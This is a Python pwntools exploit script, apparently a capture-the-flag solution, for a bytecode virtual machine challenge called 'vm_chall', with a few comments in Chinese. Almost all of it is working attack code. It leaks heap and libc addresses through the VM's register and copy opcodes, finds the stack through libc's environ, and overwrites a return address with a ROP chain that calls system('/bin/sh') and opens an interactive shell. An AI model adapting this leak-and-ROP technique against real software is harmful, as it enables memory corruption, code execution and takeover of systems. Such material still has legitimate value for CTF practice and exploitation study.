from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vm_chall"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def push_num(n):
    return b"\x31" + p8(n)


def push_reg(n):
    return b"\x32" + p8(n)


def pop_reg(idx):
    return b"\x33" + p8(idx)


def cp_reg(d, s):
    return b"\x34" + p8(d) + p8(s)


def mov_reg(idx, value):
    return b"\x35" + p8(idx) + p64(value)


def copy(dest, src, length):
    return b"\x36" + p8(dest) + p8(src) + p8(length) + p8(0)


def minus_reg(a, b):  # a-=b
    return b"\x44" + p8(a) + p8(b)


def add_reg(a, b):
    return b"\x43" + p8(a) + p8(b)


def expend():
    io.sendlineafter("[ lEn? ] >> ", "1")
    io.sendlineafter("[ BYTECODE ] >>", "F")


environ_offset = 0x1EDE28
main_arena_offset = 0x00007F86777FBB20 - 0x7F8677615000  # 0x1e6b20
heap_offset = 0x000055694C6BBB98 - 0x55694C6BB000

expend()
expend()
payload = b""

# 1. heap and libc
payload += push_reg(7) * 14
payload += mov_reg(4, 0xED) + mov_reg(1, 0xFF) + copy(4, 1, 0x81)
payload += pop_reg(7)  # r7=libc+main_arena
payload += mov_reg(1, heap_offset)
payload += minus_reg(7, 1)  # r7 heap

payload += pop_reg(6) * 10
payload += mov_reg(1, main_arena_offset)
payload += minus_reg(6, 1)  # r6 libc
payload += b"\x00"

io.sendlineafter("[ lEn? ] >> ", str(len(payload)))
io.sendlineafter("[ BYTECODE ] >>", payload)

# 2. stack
expend()

# 恢复原始栈指针
payload = cp_reg(1, 7)
payload += mov_reg(2, heap_offset)
payload += add_reg(1, 2)
payload += push_reg(1)
payload += push_reg(1)
payload += cp_reg(1, 7)
payload += mov_reg(2, 0x342)  # debug
payload += add_reg(1, 2)
payload += push_reg(1)
payload += mov_reg(1, 0x61)
payload += push_reg(1)  # 0x61

payload += cp_reg(1, 6)
payload += mov_reg(2, 0x7FFFFFFFFFFF)
payload += push_reg(2)  # rbp
payload += mov_reg(2, environ_offset - 8)
payload += add_reg(1, 2)  # r1 environ
payload += push_reg(1)  # rsp
payload += cp_reg(1, 7)
payload += mov_reg(2, 0x327)  # debug nextrip=heap+?
payload += add_reg(1, 2)
payload += push_reg(1)  # rip
payload += mov_reg(1, 0x61)
payload += push_reg(1)  # 0x61

payload += mov_reg(3, 0xF3)
payload += mov_reg(4, 0xFF)
payload += copy(4, 3, 6 * 8 + 1)
payload += pop_reg(5)  # r5 environ stack 33 05

payload += mov_reg(3, 0xF7)
payload += mov_reg(4, 0xFF)
payload += copy(4, 3, 6 * 8 + 1)

# stack offset
ret_stack_offset = 0x00007FFE9DE31068 - 0x7FFE9DE30F38 - 0x18 
payload += mov_reg(3, ret_stack_offset)
payload += minus_reg(5, 3)

payload += b"\x00"
io.sendlineafter("[ lEn? ] >> ", str(len(payload)))
io.sendlineafter("[ BYTECODE ] >>", payload)


# 3. ret->rop

expend()
payload = b""
# 把ret地址写进此vm->rsp
payload += push_reg(5) * 4
payload += mov_reg(2, 0x7FFFFFFFFFFF)
payload += push_reg(2)  # rbp
payload += push_reg(5)  # rsp
payload += cp_reg(1, 7)
payload += mov_reg(2, 0x2FB)  # debug 
payload += add_reg(1, 2)
payload += push_reg(1)
payload += mov_reg(1, 0x61)
payload += push_reg(1)  # 0x61

payload += mov_reg(3, 0xF6)
payload += mov_reg(4, 0xFF)

# 此处两个push，是为了改写state->rip,退出程序
payload += mov_reg(2, 0x7FFFFFFFFFFF)
payload += push_reg(2)  # rbp
payload += push_num(0x61)

payload += copy(4, 3, 6 * 8 + 1)

pop_rdi_ret = 0x10194A  #: pop rdi ; ret
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
ret_addr = 0x0000000000025535

# system("/bin/sh")
payload += cp_reg(1, 6) + mov_reg(2, system_addr) + add_reg(1, 2) + push_reg(1)
payload += cp_reg(1, 6) + mov_reg(2, binsh_addr) + add_reg(1, 2) + push_reg(1)
payload += cp_reg(1, 6) + mov_reg(2, pop_rdi_ret) + add_reg(1, 2) + push_reg(1)

# 栈对齐，不然system无法执行
payload += cp_reg(1, 6) + mov_reg(2, ret_addr)+ add_reg(1, 2) + push_reg(1)

payload += mov_reg(3, 0xFA) + mov_reg(4, 0xFF)
payload += copy(4, 3, 4 * 8 + 1)

payload += b"\x00"

io.sendlineafter("[ lEn? ] >> ", str(len(payload)))
io.sendlineafter("[ BYTECODE ] >>", payload)
io.interactive()
